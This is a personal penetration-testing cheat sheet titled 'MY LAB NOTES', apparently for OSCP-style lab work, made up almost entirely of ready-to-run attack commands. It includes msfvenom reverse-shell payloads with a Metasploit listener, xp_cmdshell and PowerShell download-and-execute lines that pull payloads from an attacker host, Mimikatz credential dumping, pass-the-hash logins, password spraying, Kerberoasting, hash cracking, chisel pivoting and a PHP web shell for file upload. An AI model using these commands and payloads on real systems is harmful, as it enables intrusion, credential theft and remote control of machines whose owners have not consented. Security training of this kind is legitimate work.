<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="MY_LAB_NOTES_0"></a>MY LAB NOTES</h1>
<hr>
<h2 class="code-line" data-line-start=2 data-line-end=3 ><a id="To_perform_Nmap_Complete_PortScan_2"></a>To perform Nmap Complete Port-Scan</h2>
<p class="has-line-data" data-line-start="4" data-line-end="5"><code>nmap 1.1.1.1 -p- -T4</code>    <strong>runs a tcp portscan on all the ports</strong></p>
<p class="has-line-data" data-line-start="7" data-line-end="8"><code>nmap -p 80,21,22 1.1.1.1 -A -T4</code> / <strong>used after the above command if any open ports are discovered</strong></p>
<hr>
<h2 class="code-line" data-line-start=10 data-line-end=11 ><a id="Directory_Fuzz_10"></a>Directory Fuzz</h2>
<p class="has-line-data" data-line-start="11" data-line-end="12"><code>gobuster dir --url http://1.1.1.1/ -w /root/Desktop/exploits/common.txt -t 40</code></p>
<hr>
<h2 class="code-line" data-line-start=14 data-line-end=15 ><a id="Connect_to_a_SQL_database_14"></a>Connect to a SQL database:</h2>
<p class="has-line-data" data-line-start="15" data-line-end="17"><code>impacket-mssqlclient 'username:password@ip'</code>   <strong>&lt;&lt; 1 way</strong><br>
<code>impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.120.148 -windows-auth</code>  <strong>&lt;&lt; 2nd way</strong></p>
<hr>
<h2 class="code-line" data-line-start=19 data-line-end=20 ><a id="To_create_a_shell_using_msfvenom_to_get_a_reverse_shell_from_windows_hta_shell_19"></a>To create a shell using msfvenom to get a reverse shell from windows .hta shell</h2>
<p class="has-line-data" data-line-start="20" data-line-end="21"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.183 lport=1331 -f hta-psh &gt; shell.hta</code></p>
<hr>
<h2 class="code-line" data-line-start=23 data-line-end=24 ><a id="To_create_a_shell_using_msfvenom_to_get_a_reverse_shell_from_windows_exe_shell_23"></a>To create a shell using msfvenom to get a reverse shell from windows .exe shell</h2>
<p class="has-line-data" data-line-start="24" data-line-end="25"><code>msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.1.1 LPORT=443</code></p>
<hr>
<h2 class="code-line" data-line-start=27 data-line-end=28 ><a id="To_create_Meterpreter_shell_using_mfsvenom_to_get_a_reverse_shell_27"></a>To create Meterpreter shell using mfsvenom to get a reverse shell</h2>
<p class="has-line-data" data-line-start="28" data-line-end="29"><code>msfvenom –p windows/x64/meterpreter/reverse_tcp –f exe –o shell.exe LHOST=192.168.1.1 LPORT=443</code></p>
<p class="has-line-data" data-line-start="30" data-line-end="31"><strong>To start the listner on msfconsole we can follow the below commands</strong></p>
<pre><code class="has-line-data" data-line-start="32" data-line-end="39">msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST &lt;interface-name or kali ip&gt;
set LHOST 443
run
</code></pre>
<hr>
<h2 class="code-line" data-line-start=41 data-line-end=42 ><a id="If_get_access_to_sqldatabase_using_impacketmssqlclient__we_can_use_below_command_to_gain_cmd_shell_from_sql_server_41"></a>If get access to sql-database using impacket-mssqlclient , we can use below command to gain cmd shell from sql server.</h2>
<p class="has-line-data" data-line-start="42" data-line-end="43"><code>enable_xp_cmdshell</code></p>
<h2 class="code-line" data-line-start=44 data-line-end=45 ><a id="Inside_the_SQL_shell_in_impacketmssqlclient__we_can_use_following_command_to_download_and_execute_our_msfvenom_shell_onto_our_target_machine_44"></a>Inside the SQL shell in impacket-mssqlclient , we can use following command to download and execute our msfvenom shell onto our target machine</h2>
<p class="has-line-data" data-line-start="45" data-line-end="46"><code>EXEC xp_cmdshell 'mshta.exe http://192.168.49.111:1338/shell.hta'</code></p>
<hr>
<h2 class="code-line" data-line-start=48 data-line-end=49 ><a id="Command_to_check_Privileges_Allowed_on_a_Windows_machine_48"></a>Command to check Privileges Allowed on a Windows machine</h2>
<p class="has-line-data" data-line-start="49" data-line-end="50"><code>whoami /all</code></p>
<hr>
<h2 class="code-line" data-line-start=52 data-line-end=53 ><a id="command_to_download_files_from_URL_in_windows_machine_eg_printspoofer_52"></a>command to download files from URL in windows machine. (e.g: printspoofer)</h2>
<p class="has-line-data" data-line-start="53" data-line-end="54"><code>certutil -urlcache -split -f http://192.168.1.1/Desktop/exploits/mimikatz64.exe mimikatz.exe</code></p>
<hr>
<h2 class="code-line" data-line-start=56 data-line-end=57 ><a id="command_to_download_files_in_windows_using_powershell_56"></a>command to download files in windows using powershell</h2>
<p class="has-line-data" data-line-start="57" data-line-end="58"><code>powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.45.238/exploits/nc64.exe')</code></p>
<hr>
<h2 class="code-line" data-line-start=60 data-line-end=61 ><a id="PrintSpoofer_Usage_60"></a>PrintSpoofer Usage:</h2>
<p class="has-line-data" data-line-start="61" data-line-end="62"><code>PrintSpoofer64.exe -i -c cmd</code></p>
<hr>
<h2 class="code-line" data-line-start=64 data-line-end=65 ><a id="Using_Mimikatz_on_Windows_Target_Machine_to_Extract_Credentials_such_as_NTLM_hashes_64"></a>Using Mimikatz on Windows Target Machine to Extract Credentials such as NTLM hashes</h2>
<pre><code class="has-line-data" data-line-start="66" data-line-end="70">mimikatz.exe
# privilege::debug
# sekurlsa::logonpasswords
</code></pre>
<hr>
<h2 class="code-line" data-line-start=72 data-line-end=73 ><a id="Pivoting_to_Access_Internal_Network_72"></a>Pivoting to Access Internal Network</h2>
<p class="has-line-data" data-line-start="73" data-line-end="75">Run on kali: <code>chisel server –-reverse</code><br>
Run on Target Windows Machine: <code>chisel.exe client 192.168.45.238:8080 R:socks</code></p>
<p class="has-line-data" data-line-start="76" data-line-end="79"><strong>Now every command we want to run on the internal network ip we have to append “proxychains” in the start of command:</strong><br>
Example:<br>
<code>proxychains impacket-psexec taha@10.10.81.140 -hashes ':4979d69d4ca66955c075c41cf45f24dc'</code></p>
<hr>
<h2 class="code-line" data-line-start=82 data-line-end=83 ><a id="Execute_Password_Spray_Attack_on_SMB_using_the_hashes_obtained_by_Mimikatz_82"></a>Execute Password Spray Attack on SMB using the hashes obtained by Mimikatz</h2>
<p class="has-line-data" data-line-start="83" data-line-end="84"><code>crackmapexec smb 10.10.130.140-142 -u celia.almeda -H 'e728ecbadfb02f51ce8eed753f' -d oscp.exam</code></p>
<hr>
<h2 class="code-line" data-line-start=86 data-line-end=87 ><a id="Execute_Password_Spray_on_SSH_86"></a>Execute Password Spray on SSH</h2>
<p class="has-line-data" data-line-start="87" data-line-end="88"><code>crackmapexec ssh 192.168.80.114 -u user.txt -p pass.txt</code></p>
<hr>
<h2 class="code-line" data-line-start=90 data-line-end=91 ><a id="Login_into_Windows_User_using_impacketpsexec_through_Hashes_90"></a>Login into Windows User using impacket-psexec through Hashes</h2>
<p class="has-line-data" data-line-start="91" data-line-end="92"><code>proxychains impacket-psexec tom_admin@10.10.130.140 -hashes ':4979d69d4ca66955c075c41cf45f24dc'</code></p>
<hr>
<h2 class="code-line" data-line-start=94 data-line-end=95 ><a id="Login_into_Windows_User_using_impacketpsexec_through_password_94"></a>Login into Windows User using impacket-psexec through password</h2>
<p class="has-line-data" data-line-start="95" data-line-end="96"><code>impacket-psexec taha@10.10.10.10</code> / Enter password after sending command</p>
<hr>
<h2 class="code-line" data-line-start=98 data-line-end=99 ><a id="Login_to_windows_user_on_evilWinrm_98"></a>Login to windows user on evil-Winrm</h2>
<p class="has-line-data" data-line-start="99" data-line-end="100"><code>proxychains4 -q evil-winrm -i 10.10.130.142 -u &quot;celia.almeda&quot; -H e728ecbadfb02f51ce8eed753f3fd</code></p>
<hr>
<h2 class="code-line" data-line-start=103 data-line-end=104 ><a id="Login_to_windows_user_using_RDP_103"></a>Login to windows user using RDP</h2>
<p class="has-line-data" data-line-start="104" data-line-end="106"><code>xfreerdp /u:testuser /v:127.0.0.1</code> &lt;&lt; <strong>connect to rdp</strong><br>
<code>xfreerdp /cert:ignore /u:testuser /v:127.0.0.1 /drive:taha,/root/Desktop/exploits</code> &lt;&lt; <strong>connect to rdp and share attackbox folder</strong></p>
<hr>
<h2 class="code-line" data-line-start=108 data-line-end=109 ><a id="To_execute_PowerViewps1_on_Windows_Target_Machine_108"></a>To execute PowerView.ps1 on Windows Target Machine</h2>
<p class="has-line-data" data-line-start="109" data-line-end="110"><code>iex(iwr http://127.0.0.1/PowerView.ps1 -UseBasicParsing) Get-DomainComputer | select name</code></p>
<hr>
<h2 class="code-line" data-line-start=112 data-line-end=113 ><a id="Search_for_Files_in_Windows_112"></a>Search for Files in Windows</h2>
<p class="has-line-data" data-line-start="113" data-line-end="114"><code>Get-ChildItem -Path C:\ -Filter filename -Recurse -ErrorAction SilentlyContinue -Force</code></p>
<hr>
<h2 class="code-line" data-line-start=116 data-line-end=117 ><a id="To_Connect_to_Windows_Target_Machine_In_order_to_download_files_from_windows_to_our_kali_machine_116"></a>To Connect to Windows Target Machine In order to download files from windows to our kali machine</h2>
<p class="has-line-data" data-line-start="117" data-line-end="119">Connect Command: <code>proxychains4 -q evil-winrm -i 127.0.0.1 -u &quot;tom.green&quot; -H examplehash</code><br>
Download Command: <code>download demofile.exe</code></p>
<hr>
<h2 class="code-line" data-line-start=122 data-line-end=123 ><a id="Get_Kerberoasting_Hashes_122"></a>Get Kerberoasting Hashes</h2>
<p class="has-line-data" data-line-start="123" data-line-end="124"><code>impacket-GetUserSPNs domain.controler/taha.khan:tahapassword -dc-ip 1.1.1.1 -outputfile hash.txt</code></p>
<hr>
<h2 class="code-line" data-line-start=126 data-line-end=127 ><a id="Check_SMB_shares_access_126"></a>Check SMB shares access</h2>
<p class="has-line-data" data-line-start="127" data-line-end="129"><code>smbclient –L 127.0.0.1 –U dc.control/user%Pass</code> &lt;&lt; <strong>to list shares</strong><br>
<code>smbclient //127.0.0.1/secret-folder -U dc.control/user%Pass</code>&lt;&lt; <strong>to access share</strong></p>
<hr>
<h2 class="code-line" data-line-start=130 data-line-end=131 ><a id="Extract_Secrets_from_SAM__SYSTEM_files_in_windows_130"></a>Extract Secrets from SAM , SYSTEM files in windows</h2>
<p class="has-line-data" data-line-start="131" data-line-end="132"><code>impacket-secretsdump -sam SAM -system SYSTEM LOCAL</code></p>
<hr>
<h2 class="code-line" data-line-start=134 data-line-end=135 ><a id="Hash_Cracking_134"></a>Hash Cracking</h2>
<p class="has-line-data" data-line-start="135" data-line-end="141"><code>hashcat -a 0 -m 1000 hash.txt rockyou.txt</code>   &lt;&lt; <strong>to crack ntlm</strong><br>
<code>hashcat -a 0 -m 5600 hash.txt rockyou.txt</code>     &lt;&lt; <strong>to crack NTLMv2</strong><br>
<code>hashcat -a 0 -m 13100 hash.txt rockyou.txt</code>  &lt;&lt; <strong>crack kerberos user hashes</strong><br>
<code>john --wordlist=root/Desktop/exploits/rockyou.txt hash.txt</code> &lt;&lt; <strong>to crack hash</strong><br>
<code>office2john file.docx &gt; hash.txt</code> &lt;&lt; <strong>To convert a office file into hash file</strong><br>
<code>john –format=crypt hash.txt</code></p>
<hr>
<h2 class="code-line" data-line-start=143 data-line-end=144 ><a id="Spawn_a_stable_shell_using_python_143"></a>Spawn a stable shell using python</h2>
<p class="has-line-data" data-line-start="144" data-line-end="145"><code>python -c ‘import pty;pty.spawn(“/bin/bash”)’</code></p>
<hr>
<h2 class="code-line" data-line-start=148 data-line-end=149 ><a id="BruteForce_SSH_using_Hydra_148"></a>Brute-Force SSH using Hydra</h2>
<p class="has-line-data" data-line-start="149" data-line-end="150"><code>hydra –L users.txt –P passwords.txt ssh://1.1.1.1</code></p>
<hr>
<h2 class="code-line" data-line-start=153 data-line-end=154 ><a id="SSH_tunnelling_expose_a_port_to_attackbox_153"></a>SSH tunnelling expose a port to attackbox</h2>
<p class="has-line-data" data-line-start="154" data-line-end="156"><code>ssh -N -L localhost:8080:localhost:80 taha@1.1.1.1</code><br>
<strong>The above command will tunnel port 80 on victim machine , and expose it on attackbox on port 8080</strong></p>
<h2 class="code-line" data-line-start=157 data-line-end=158 ><a id="Escalate_Linux_Privileges_157"></a>Escalate Linux Privileges</h2>
<ul>
<li class="has-line-data" data-line-start="158" data-line-end="159"><code>find / -perm -u=s -type f 2&gt;/dev/null</code>   &lt; <strong>finding SUID binaries</strong></li>
<li class="has-line-data" data-line-start="159" data-line-end="160"><code>https://gtfobins.github.io/</code> &lt;&lt; <strong>to find how to escalate using different SUID binaries</strong></li>
<li class="has-line-data" data-line-start="160" data-line-end="161"><code>./linpease.sh</code></li>
<li class="has-line-data" data-line-start="161" data-line-end="163"><code>sudo -l</code></li>
</ul>
<hr>
<h2 class="code-line" data-line-start=164 data-line-end=165 ><a id="PHP_shell_to_Use_in_File_Upload_164"></a>PHP shell to Use in File Upload</h2>
<p class="has-line-data" data-line-start="165" data-line-end="166"><code>&lt;?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd);}?&gt;</code></p>
<hr>
<h2 class="code-line" data-line-start=168 data-line-end=169 ><a id="Helpfullinuxcommands_168"></a>Helpful-linux-commands</h2>
<p class="has-line-data" data-line-start="169" data-line-end="170"><strong>connect to ssh using id_rsa file</strong></p>
<pre><code class="has-line-data" data-line-start="171" data-line-end="174">chmod 600 id_rsa
ssh -i id_rsa root@192.168.111.110
</code></pre>
<p class="has-line-data" data-line-start="175" data-line-end="176"><code>ftp anonymous@192.168.111.111</code> &lt;&lt; <strong>connect to ftp</strong></p>
<p class="has-line-data" data-line-start="177" data-line-end="178"><code>xfreerdp /u:testuser /v:127.0.0.1</code>  &lt;&lt; <strong>connect to rdp</strong></p>
<p class="has-line-data" data-line-start="179" data-line-end="181"><code>nc -lnvp 1338</code> &lt;&lt; <strong>revershell listening</strong><br>
<code>file taha.zip</code> &lt;&lt; <strong>to know the file type</strong></p>
<hr>
<h2 class="code-line" data-line-start=184 data-line-end=185 ><a id="Kill_Ports_184"></a>Kill Ports</h2>
<p class="has-line-data" data-line-start="185" data-line-end="187"><code>fuser 8080/tcp</code> &lt;&lt; <strong>To check if any process running on port</strong><br>
<code>fuser -k 8080/tcp</code> &lt;&lt; <strong>To kill the port</strong></p>
